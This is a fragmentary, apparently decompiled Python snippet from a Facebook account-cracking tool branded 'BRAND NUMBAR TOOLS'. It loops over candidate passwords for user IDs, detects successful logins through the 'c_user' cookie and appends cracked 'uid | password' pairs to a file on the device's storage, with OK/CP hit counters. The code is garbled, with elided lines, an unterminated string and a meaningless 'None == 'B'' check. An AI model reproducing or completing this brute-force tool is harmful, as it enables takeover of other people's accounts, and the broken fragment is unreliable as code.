...
def o():
    ...
    jalan('\t   \033[38;5;192m��BRAND NUMBAR TOOLS��')
    ...
    if None == 'B':
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000812025846&mibextid=ZbWKwL)
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print( ' \033[38;5;196m[BRAND-CP��]  ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/BRAND-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[BRAND-XD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
